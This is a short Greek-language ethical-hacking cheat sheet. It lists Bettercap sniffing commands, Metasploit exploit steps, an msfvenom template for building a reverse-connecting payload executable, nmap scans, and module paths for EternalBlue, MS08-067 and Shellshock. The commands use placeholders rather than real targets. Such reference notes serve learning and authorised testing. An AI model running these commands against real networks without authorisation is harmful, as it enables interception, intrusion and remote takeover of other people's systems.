# 🛡️ Ethical Hacking: Basic Commands and Useful Exploits

Αυτό το έγγραφο καλύπτει βασικές εντολές και εκμεταλλεύσεις (exploits) στον χώρο του ethical hacking, με έμφαση στα εργαλεία **Metasploit** και **Bettercap**.

---

## 1. 🔍 Bettercap Commands

**Bettercap** είναι ισχυρό εργαλείο για παρακολούθηση και επίθεση σε δίκτυα.

- Εκκίνηση Bettercap:
```bash
sudo bettercap -iface <interface>
Ενεργοποίηση Network Recon:

net.recon on
Ενεργοποίηση Sniffing:

net.sniff on
Ενεργοποίηση Service Probing:

net.probe on
2. 💣 Metasploit Commands
Το Metasploit Framework είναι ισχυρή πλατφόρμα για δημιουργία και εκτέλεση exploits.

Εκκίνηση Metasploit:

msfconsole
Αναζήτηση Exploit:

search <exploit>
Ορισμός IP Στόχου (RHOST):

set RHOST <target_ip>
Ορισμός Τοπικής IP (LHOST):

set LHOST <your_ip>
Ορισμός Payload:

set PAYLOAD <payload_name>
Εκτέλεση Exploit:

exploit
3. 🧬 msfvenom Commands
Το msfvenom χρησιμοποιείται για δημιουργία custom payloads.

Δημιουργία Payload (.exe):

msfvenom -p <payload_type> LHOST=<your_ip> LPORT=<port> -f exe > payload.exe
4. 🌐 Nmap για Σάρωση
Το Nmap είναι βασικό εργαλείο για εξερεύνηση δικτύων και ανάλυση ευπαθειών.

Σάρωση Συγκεκριμένων Ports:

nmap -p <ports> <target_ip>
Έλεγχος Εκδόσεων Υπηρεσιών:

nmap -sV <target_ip>
5. 💥 Common and Effective Exploits
Μερικά από τα πιο γνωστά και αποτελεσματικά exploits στο Metasploit:

MS17-010 (EternalBlue)
Στόχος: SMBv1 – Windows XP, 7, 8, 10
Path:

exploit/windows/smb/ms17_010_eternalblue
MS08-067 (Netapi)
Παλαιό αλλά αποτελεσματικό για Windows legacy συστήματα.
Path:

exploit/windows/smb/ms08_067_netapi
Shellshock
Τρωτότητα στο Bash – Remote Code Execution σε Unix συστήματα.
Path:

exploit/multi/http/apache_mod_cgi_bash_env